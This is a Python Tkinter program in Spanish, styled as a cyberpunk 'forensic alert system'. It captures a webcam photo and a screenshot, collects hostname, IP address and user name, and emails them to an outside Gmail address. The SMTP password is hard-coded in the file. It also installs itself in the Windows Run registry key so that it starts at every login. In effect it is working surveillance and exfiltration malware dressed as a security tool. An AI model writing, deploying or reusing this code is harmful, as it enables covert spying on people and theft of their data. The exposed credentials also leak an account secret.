import os
import sys
import smtplib
import socket
import getpass
from datetime import datetime
import cv2
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.image import MIMEImage
import platform
import pyautogui
import winreg
import tkinter as tk
from tkinter import ttk, messagebox
import threading
import time

# Configuración SMTP
SMTP_CONFIG = {
    "server": "smtp.gmail.com",
    "port": 587,
    "user": "neritpa@gmail.com",
    "password": "ymwgrjmbwigsrydm",
    "recipient": "fxmspaha@gmail.com"
}

class CyberpunkStyle:
    """Clase para manejar estilos cyberpunk"""
    
    # Colores cyberpunk
    NEON_PINK = "#ff00ff"
    NEON_BLUE = "#00ffff"
    NEON_GREEN = "#00ff00"
    NEON_YELLOW = "#ffff00"
    DARK_BG = "#0a0a0a"
    DARKER_BG = "#050505"
    GRAY_BG = "#1a1a1a"
    TEXT_COLOR = "#ffffff"
    BORDER_COLOR = "#333333"
    
    @staticmethod
    def create_cyberpunk_style():
        """Crea y configura estilos cyberpunk"""
        style = ttk.Style()
        
        # Configurar tema base
        style.theme_use('clam')
        
        # Frame principal
        style.configure('Cyberpunk.TFrame', 
                       background=CyberpunkStyle.DARK_BG,
                       borderwidth=2,
                       relief='solid')
        
        # Labels
        style.configure('Cyberpunk.TLabel',
                       background=CyberpunkStyle.DARK_BG,
                       foreground=CyberpunkStyle.TEXT_COLOR,
                       font=('Consolas', 10))
        
        # Header label
        style.configure('Header.TLabel',
                       background=CyberpunkStyle.DARK_BG,
                       foreground=CyberpunkStyle.NEON_PINK,
                       font=('Consolas', 16, 'bold'))
        
        # Buttons
        style.configure('Cyberpunk.TButton',
                       background=CyberpunkStyle.GRAY_BG,
                       foreground=CyberpunkStyle.NEON_BLUE,
                       borderwidth=2,
                       relief='solid',
                       font=('Consolas', 10, 'bold'))
        
        style.map('Cyberpunk.TButton',
                 background=[('active', CyberpunkStyle.NEON_BLUE)],
                 foreground=[('active', CyberpunkStyle.DARK_BG)])
        
        # Entry
        style.configure('Cyberpunk.TEntry',
                       fieldbackground=CyberpunkStyle.GRAY_BG,
                       foreground=CyberpunkStyle.NEON_GREEN,
                       borderwidth=2,
                       relief='solid',
                       font=('Consolas', 10))
        
        # Combobox
        style.configure('Cyberpunk.TCombobox',
                       fieldbackground=CyberpunkStyle.GRAY_BG,
                       foreground=CyberpunkStyle.NEON_GREEN,
                       background=CyberpunkStyle.GRAY_BG,
                       borderwidth=2,
                       relief='solid',
                       font=('Consolas', 10))
        
        # Checkbutton
        style.configure('Cyberpunk.TCheckbutton',
                       background=CyberpunkStyle.DARK_BG,
                       foreground=CyberpunkStyle.NEON_YELLOW,
                       font=('Consolas', 10))
        
        # LabelFrame
        style.configure('Cyberpunk.TLabelframe',
                       background=CyberpunkStyle.DARK_BG,
                       foreground=CyberpunkStyle.NEON_PINK,
                       borderwidth=2,
                       relief='solid',
                       font=('Consolas', 10, 'bold'))
        
        style.configure('Cyberpunk.TLabelframe.Label',
                       background=CyberpunkStyle.DARK_BG,
                       foreground=CyberpunkStyle.NEON_PINK,
                       font=('Consolas', 10, 'bold'))
        
        return style

class AnimatedLabel(tk.Label):
    """Label con animación de texto cyberpunk"""
    
    def __init__(self, parent, text, **kwargs):
        super().__init__(parent, **kwargs)
        self.full_text = text
        self.current_text = ""
        self.char_index = 0
        self.animate_text()
    
    def animate_text(self):
        if self.char_index < len(self.full_text):
            self.current_text += self.full_text[self.char_index]
            self.config(text=self.current_text)
            self.char_index += 1
            self.after(50, self.animate_text)

class ForensicApp:
    def __init__(self, root):
        self.root = root
        self.root.title("Sistema de Alertas Forenses CAI - Edición Cyberpunk")
        self.root.geometry("800x600")
        self.root.configure(bg=CyberpunkStyle.DARK_BG)
        
        # Configurar icono y estilo de ventana
        self.root.option_add('*TFrame*background', CyberpunkStyle.DARK_BG)
        self.root.option_add('*TLabel*background', CyberpunkStyle.DARK_BG)
        self.root.option_add('*TButton*background', CyberpunkStyle.GRAY_BG)
        
        # Aplicar estilos cyberpunk
        self.style = CyberpunkStyle.create_cyberpunk_style()
        
        # Variables para animaciones
        self.animation_running = True
        self.scan_line_position = 0
        
        self.create_widgets()
        self.start_animations()
        
    def create_widgets(self):
        # Frame principal con borde neón
        main_frame = tk.Frame(self.root, 
                             bg=CyberpunkStyle.DARK_BG,
                             bd=3,
                             relief='solid',
                             highlightbackground=CyberpunkStyle.NEON_PINK,
                             highlightthickness=2)
        main_frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        
        # Header con animación
        header_frame = tk.Frame(main_frame, bg=CyberpunkStyle.DARK_BG)
        header_frame.pack(fill=tk.X, pady=(20, 10))
        
        # Logo/ASCII art cyberpunk
        logo_text = """
╔══════════════════════════════════════════════════════════════╗
║                SISTEMA DE ALERTAS FORENSES CAI               ║
║                     EDICIÓN CYBERPUNK                        ║
║                  [MONITOREO DE SEGURIDAD]                    ║
╚══════════════════════════════════════════════════════════════╝
        """
        
        logo_label = tk.Label(header_frame, 
                             text=logo_text,
                             font=('Consolas', 8),
                             fg=CyberpunkStyle.NEON_PINK,
                             bg=CyberpunkStyle.DARK_BG,
                             justify=tk.CENTER)
        logo_label.pack()
        
        # Título animado
        title_label = AnimatedLabel(header_frame,
                                   "ESTADO DEL SISTEMA: ACTIVO | MONITOREO: HABILITADO | SEGURIDAD: MÁXIMA",
                                   font=('Consolas', 12, 'bold'),
                                   fg=CyberpunkStyle.NEON_GREEN,
                                   bg=CyberpunkStyle.DARK_BG)
        title_label.pack(pady=10)
        
        # Contenedor principal
        content_frame = tk.Frame(main_frame, bg=CyberpunkStyle.DARK_BG)
        content_frame.pack(fill=tk.BOTH, expand=True, padx=20, pady=10)
        
        # Panel izquierdo
        left_panel = tk.Frame(content_frame, bg=CyberpunkStyle.DARK_BG)
        left_panel.pack(side=tk.LEFT, fill=tk.BOTH, expand=True, padx=(0, 10))
        
        # Panel derecho
        right_panel = tk.Frame(content_frame, bg=CyberpunkStyle.DARK_BG)
        right_panel.pack(side=tk.RIGHT, fill=tk.BOTH, expand=True, padx=(10, 0))
        
        # === PANEL IZQUIERDO ===
        
        # Event Type Section
        event_frame = tk.LabelFrame(left_panel, 
                                   text="CLASIFICACIÓN DE EVENTOS",
                                   font=('Consolas', 10, 'bold'),
                                   fg=CyberpunkStyle.NEON_PINK,
                                   bg=CyberpunkStyle.DARK_BG,
                                   bd=2,
                                   relief='solid',
                                   highlightbackground=CyberpunkStyle.NEON_PINK,
                                   highlightthickness=1)
        event_frame.pack(fill=tk.X, pady=10)
        
        tk.Label(event_frame, 
                text="TIPO DE AMENAZA:",
                font=('Consolas', 10, 'bold'),
                fg=CyberpunkStyle.NEON_YELLOW,
                bg=CyberpunkStyle.DARK_BG).pack(anchor=tk.W, padx=10, pady=5)
        
        self.event_type = ttk.Combobox(event_frame, 
                                      values=[
                                          "ACCESO NO AUTORIZADO DETECTADO",
                                          "ACTIVIDAD SOSPECHOSA MONITOREADA",
                                          "INTENTO DE EXFILTRACIÓN DE DATOS",
                                          "ALERTA DE COMPROMISO DEL SISTEMA",
                                          "VIOLACIÓN CRÍTICA DE SEGURIDAD",
                                          "INTRUSIÓN DE RED DETECTADA"
                                      ],
                                      style='Cyberpunk.TCombobox',
                                      font=('Consolas', 10))
        self.event_type.pack(fill=tk.X, padx=10, pady=5)
        self.event_type.current(0)
        
        # User Section
        user_frame = tk.LabelFrame(left_panel,
                                  text="IDENTIFICACIÓN DEL OBJETIVO",
                                  font=('Consolas', 10, 'bold'),
                                  fg=CyberpunkStyle.NEON_PINK,
                                  bg=CyberpunkStyle.DARK_BG,
                                  bd=2,
                                  relief='solid',
                                  highlightbackground=CyberpunkStyle.NEON_PINK,
                                  highlightthickness=1)
        user_frame.pack(fill=tk.X, pady=10)
        
        tk.Label(user_frame,
                text="ID DEL SOSPECHOSO:",
                font=('Consolas', 10, 'bold'),
                fg=CyberpunkStyle.NEON_YELLOW,
                bg=CyberpunkStyle.DARK_BG).pack(anchor=tk.W, padx=10, pady=5)
        
        self.user = ttk.Entry(user_frame, style='Cyberpunk.TEntry', font=('Consolas', 10))
        self.user.pack(fill=tk.X, padx=10, pady=5)
        self.user.insert(0, getpass.getuser())
        
        # === PANEL DERECHO ===
        
        # Evidence Collection Section
        evidence_frame = tk.LabelFrame(right_panel,
                                      text="ADQUISICIÓN DE EVIDENCIAS",
                                      font=('Consolas', 10, 'bold'),
                                      fg=CyberpunkStyle.NEON_PINK,
                                      bg=CyberpunkStyle.DARK_BG,
                                      bd=2,
                                      relief='solid',
                                      highlightbackground=CyberpunkStyle.NEON_PINK,
                                      highlightthickness=1)
        evidence_frame.pack(fill=tk.X, pady=10)
        
        self.capture_webcam = tk.BooleanVar(value=True)
        self.capture_screenshot = tk.BooleanVar(value=True)
        
        # Checkboxes con estilo cyberpunk
        webcam_cb = tk.Checkbutton(evidence_frame,
                                   text="CAPTURAR DATOS BIOMÉTRICOS",
                                   variable=self.capture_webcam,
                                   font=('Consolas', 10, 'bold'),
                                   fg=CyberpunkStyle.NEON_GREEN,
                                   bg=CyberpunkStyle.DARK_BG,
                                   selectcolor=CyberpunkStyle.DARKER_BG,
                                   activebackground=CyberpunkStyle.DARK_BG,
                                   activeforeground=CyberpunkStyle.NEON_GREEN)
        webcam_cb.pack(anchor=tk.W, padx=10, pady=5)
        
        screenshot_cb = tk.Checkbutton(evidence_frame,
                                      text="CAPTURAR DATOS DE PANTALLA",
                                      variable=self.capture_screenshot,
                                      font=('Consolas', 10, 'bold'),
                                      fg=CyberpunkStyle.NEON_GREEN,
                                      bg=CyberpunkStyle.DARK_BG,
                                      selectcolor=CyberpunkStyle.DARKER_BG,
                                      activebackground=CyberpunkStyle.DARK_BG,
                                      activeforeground=CyberpunkStyle.NEON_GREEN)
        screenshot_cb.pack(anchor=tk.W, padx=10, pady=5)
        
        # System Status
        status_frame = tk.LabelFrame(right_panel,
                                     text="ESTADO DEL SISTEMA",
                                     font=('Consolas', 10, 'bold'),
                                     fg=CyberpunkStyle.NEON_PINK,
                                     bg=CyberpunkStyle.DARK_BG,
                                     bd=2,
                                     relief='solid',
                                     highlightbackground=CyberpunkStyle.NEON_PINK,
                                     highlightthickness=1)
        status_frame.pack(fill=tk.X, pady=10)
        
        self.status_label = tk.Label(status_frame,
                                    text="ESTADO: LISTO | SEGURIDAD: MÁXIMA | MONITOREO: ACTIVO",
                                    font=('Consolas', 9),
                                    fg=CyberpunkStyle.NEON_GREEN,
                                    bg=CyberpunkStyle.DARK_BG)
        self.status_label.pack(padx=10, pady=5)
        
        # === BOTONES INFERIORES ===
        
        button_frame = tk.Frame(main_frame, bg=CyberpunkStyle.DARK_BG)
        button_frame.pack(fill=tk.X, pady=20, padx=20)
        
        # Botón principal con efecto neón
        alert_button = tk.Button(button_frame,
                                text="🚨 ENVIAR ALERTA 🚨",
                                command=self.send_alert,
                                font=('Consolas', 12, 'bold'),
                                fg=CyberpunkStyle.DARK_BG,
                                bg=CyberpunkStyle.NEON_PINK,
                                bd=3,
                                relief='solid',
                                activebackground=CyberpunkStyle.NEON_BLUE,
                                activeforeground=CyberpunkStyle.DARK_BG,
                                cursor='hand2')
        alert_button.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=5)
        
        # Botón de persistencia
        persist_button = tk.Button(button_frame,
                                  text="⚡ INSTALAR PERSISTENCIA ⚡",
                                  command=self.install_persistence,
                                  font=('Consolas', 10, 'bold'),
                                  fg=CyberpunkStyle.DARK_BG,
                                  bg=CyberpunkStyle.NEON_BLUE,
                                  bd=3,
                                  relief='solid',
                                  activebackground=CyberpunkStyle.NEON_GREEN,
                                  activeforeground=CyberpunkStyle.DARK_BG,
                                  cursor='hand2')
        persist_button.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=5)
        
        # Botón de salida
        exit_button = tk.Button(button_frame,
                               text="❌ SALIR DEL SISTEMA ❌",
                               command=self.root.quit,
                               font=('Consolas', 10, 'bold'),
                               fg=CyberpunkStyle.DARK_BG,
                               bg=CyberpunkStyle.NEON_YELLOW,
                               bd=3,
                               relief='solid',
                               activebackground=CyberpunkStyle.NEON_PINK,
                               activeforeground=CyberpunkStyle.DARK_BG,
                               cursor='hand2')
        exit_button.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=5)
        
        # Línea de escaneo animada
        self.scan_canvas = tk.Canvas(main_frame,
                                     height=2,
                                     bg=CyberpunkStyle.DARK_BG,
                                     highlightthickness=0)
        self.scan_canvas.pack(fill=tk.X, padx=20, pady=5)
        
    def start_animations(self):
        """Inicia las animaciones cyberpunk"""
        self.animate_scan_line()
        self.animate_status()
        
    def animate_scan_line(self):
        """Anima la línea de escaneo"""
        if not self.animation_running:
            return
            
        self.scan_canvas.delete("all")
        width = self.scan_canvas.winfo_width()
        
        # Línea de escaneo neón
        self.scan_canvas.create_line(self.scan_line_position, 0, 
                                    self.scan_line_position + 50, 0,
                                    fill=CyberpunkStyle.NEON_GREEN,
                                    width=3)
        
        # Efecto de desvanecimiento
        self.scan_canvas.create_line(self.scan_line_position - 20, 0,
                                    self.scan_line_position, 0,
                                    fill=CyberpunkStyle.NEON_BLUE,
                                    width=2)
        
        self.scan_line_position += 5
        if self.scan_line_position > width:
            self.scan_line_position = 0
            
        self.root.after(50, self.animate_scan_line)
        
    def animate_status(self):
        """Anima el texto de estado"""
        if not self.animation_running:
            return
            
        current_text = self.status_label.cget("text")
        if "LISTO" in current_text:
            new_text = "ESTADO: ESCANEANDO | SEGURIDAD: MÁXIMA | MONITOREO: ACTIVO"
        elif "ESCANEANDO" in current_text:
            new_text = "ESTADO: ALERTA | SEGURIDAD: MÁXIMA | MONITOREO: ACTIVO"
        else:
            new_text = "ESTADO: LISTO | SEGURIDAD: MÁXIMA | MONITOREO: ACTIVO"
            
        self.status_label.config(text=new_text)
        self.root.after(2000, self.animate_status)
        
    def send_alert(self):
        """Handle the alert sending process"""
        event_type = self.event_type.get()
        user = self.user.get()
        
        if not event_type or not user:
            messagebox.showerror("ERROR", "POR FAVOR ESPECIFICA TANTO EL TIPO DE EVENTO COMO EL USUARIO")
            return
        
        # Cambiar estado durante el envío
        self.status_label.config(text="ESTADO: ENVIANDO ALERTA | SEGURIDAD: MÁXIMA | MONITOREO: ACTIVO",
                                fg=CyberpunkStyle.NEON_YELLOW)
        
        # Capture evidence based on user selection
        attachments = []
        
        if self.capture_webcam.get():
            webcam_file = capture_webcam_photo()
            if webcam_file:
                attachments.append(webcam_file)
        
        if self.capture_screenshot.get():
            screenshot_file = capture_screenshot()
            if screenshot_file:
                attachments.append(screenshot_file)
        
        # Send the alert
        success = send_forensic_alert(event_type, user, attachments)
        
        if success:
            self.status_label.config(text="ESTADO: ALERTA ENVIADA | SEGURIDAD: MÁXIMA | MONITOREO: ACTIVO",
                                    fg=CyberpunkStyle.NEON_GREEN)
            messagebox.showinfo("ÉXITO", "ALERTA FORENSE TRANSMITIDA EXITOSAMENTE")
        else:
            self.status_label.config(text="ESTADO: ALERTA FALLIDA | SEGURIDAD: MÁXIMA | MONITOREO: ACTIVO",
                                    fg=CyberpunkStyle.NEON_PINK)
            messagebox.showerror("ERROR", "FALLO AL TRANSMITIR ALERTA FORENSE")
    
    def install_persistence(self):
        """Instala persistencia en el registro para que se ejecute al iniciar sesión"""
        try:
            # Obtener la ruta del ejecutable actual
            app_path = os.path.abspath(sys.argv[0])
            
            # Abrir la clave del registro donde agregaremos nuestra entrada
            key = winreg.OpenKey(
                winreg.HKEY_CURRENT_USER,
                r"Software\Microsoft\Windows\CurrentVersion\Run",
                0, winreg.KEY_SET_VALUE
            )
            
            # Agregar nuestra aplicación para que se ejecute al iniciar sesión
            winreg.SetValueEx(key, "CAIForensicMonitor", 0, winreg.REG_SZ, f'"{app_path}" --minimized')
            winreg.CloseKey(key)
            
            # También agregar al registro de inicio de sesión para mayor seguridad
            try:
                key_shell = winreg.OpenKey(
                    winreg.HKEY_CURRENT_USER,
                    r"Software\Microsoft\Windows\CurrentVersion\Shell\Startup",
                    0, winreg.KEY_SET_VALUE
                )
                winreg.SetValueEx(key_shell, "CAIForensicMonitor", 0, winreg.REG_SZ, f'"{app_path}" --minimized')
                winreg.CloseKey(key_shell)
            except:
                pass  # Si no existe la clave, continuamos
            
            self.status_label.config(text="ESTADO: PERSISTENCIA INSTALADA | SEGURIDAD: MÁXIMA | MONITOREO: ACTIVO",
                                    fg=CyberpunkStyle.NEON_GREEN)
            messagebox.showinfo("ÉXITO", "MÓDULO DE PERSISTENCIA INSTALADO EXITOSAMENTE\n\nEl sistema se ejecutará automáticamente cada vez que inicies sesión.")
        except Exception as e:
            self.status_label.config(text="ESTADO: PERSISTENCIA FALLIDA | SEGURIDAD: MÁXIMA | MONITOREO: ACTIVO",
                                    fg=CyberpunkStyle.NEON_PINK)
            messagebox.showerror("ERROR", f"FALLO AL INSTALAR PERSISTENCIA: {str(e)}")

def get_system_info():
    """Obtiene información detallada del sistema"""
    return {
        "hostname": socket.gethostname(),
        "ip": socket.gethostbyname(socket.gethostname()),
        "user": getpass.getuser(),
        "os": f"{platform.system()} {platform.release()}",
        "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    }

def capture_webcam_photo():
    """Captura foto desde la cámara web"""
    try:
        cap = cv2.VideoCapture(0)
        if cap.isOpened():
            ret, frame = cap.read()
            if ret:
                filename = f"webcam_{datetime.now().strftime('%Y%m%d_%H%M%S')}.jpg"
                cv2.imwrite(filename, frame)
                return filename
        return None
    except Exception as e:
        print(f"Error cámara: {str(e)}", file=sys.stderr)
        return None
    finally:
        if 'cap' in locals():
            cap.release()

def capture_screenshot():
    """Captura pantalla completa"""
    try:
        filename = f"screenshot_{datetime.now().strftime('%Y%m%d_%H%M%S')}.png"
        pyautogui.screenshot(filename)
        return filename
    except Exception as e:
        print(f"Error screenshot: {str(e)}", file=sys.stderr)
        return None

def send_forensic_alert(event_type, user, attachments=[]):
    """Envía alerta por correo con evidencias"""
    sys_info = get_system_info()
    sys_info['user'] = user
    
    # Crear mensaje
    msg = MIMEMultipart()
    msg['From'] = SMTP_CONFIG['user']
    msg['To'] = SMTP_CONFIG['recipient']
    msg['Subject'] = f"ALERTA CAI - {event_type} - {sys_info['hostname']}"
    
    # Cuerpo del mensaje
    body = f"""
    <html>
    <body style="font-family: Arial, sans-serif;">
        <h2 style="color: #d9534f;">Alerta de Seguridad CAI</h2>
        <table border="1" cellpadding="5" style="border-collapse: collapse;">
            <tr style="background-color: #f2f2f2;">
                <th>Campo</th>
                <th>Valor</th>
            </tr>
            <tr>
                <td><strong>Evento</strong></td>
                <td style="color: #d9534f;">{event_type}</td>
            </tr>
            <tr>
                <td><strong>Hostname</strong></td>
                <td>{sys_info['hostname']}</td>
            </tr>
            <tr>
                <td><strong>Dirección IP</strong></td>
                <td>{sys_info['ip']}</td>
            </tr>
            <tr>
                <td><strong>Usuario</strong></td>
                <td>{sys_info['user']}</td>
            </tr>
            <tr>
                <td><strong>Sistema Operativo</strong></td>
                <td>{sys_info['os']}</td>
            </tr>
            <tr>
                <td><strong>Fecha/Hora</strong></td>
                <td>{sys_info['timestamp']}</td>
            </tr>
        </table>
        <p style="margin-top: 20px; color: #777;">
            Este mensaje fue generado automáticamente por el Sistema de Seguridad CAI.
        </p>
    </body>
    </html>
    """
    
    msg.attach(MIMEText(body, 'html'))
    
    # Adjuntar evidencias
    for file in attachments:
        if file and os.path.exists(file):
            with open(file, 'rb') as f:
                if file.endswith('.jpg') or file.endswith('.png'):
                    img = MIMEImage(f.read())
                    img.add_header('Content-Disposition', 'attachment', filename=os.path.basename(file))
                    msg.attach(img)
    
    # Enviar correo
    try:
        with smtplib.SMTP(SMTP_CONFIG['server'], SMTP_CONFIG['port']) as server:
            server.starttls()
            server.login(SMTP_CONFIG['user'], SMTP_CONFIG['password'])
            server.send_message(msg)
        return True
    except Exception as e:
        print(f"Error enviando correo: {str(e)}", file=sys.stderr)
        return False
    finally:
        # Limpiar archivos temporales
        for file in attachments:
            if file and os.path.exists(file):
                os.remove(file)

def check_persistence():
    """Check if persistence is already installed"""
    try:
        key = winreg.OpenKey(
            winreg.HKEY_CURRENT_USER,
            r"Software\Microsoft\Windows\CurrentVersion\Run",
            0, winreg.KEY_READ
        )
        
        try:
            value, _ = winreg.QueryValueEx(key, "CAIForensicMonitor")
            return True
        except FileNotFoundError:
            return False
        finally:
            winreg.CloseKey(key)
    except Exception:
        return False

if __name__ == "__main__":
    # Check if we should run in minimized mode
    if "--minimized" in sys.argv:
        # Here you could add code to run in background
        # For example, monitoring for specific events
        pass
    else:
        root = tk.Tk()
        app = ForensicApp(root)
        
        # Check and notify about persistence
        if not check_persistence():
            if messagebox.askyesno("Persistencia", "La persistencia no está instalada. ¿Te gustaría instalarla ahora?\n\nEsto hará que el sistema se ejecute automáticamente cada vez que inicies sesión."):
                app.install_persistence()
        
        root.mainloop()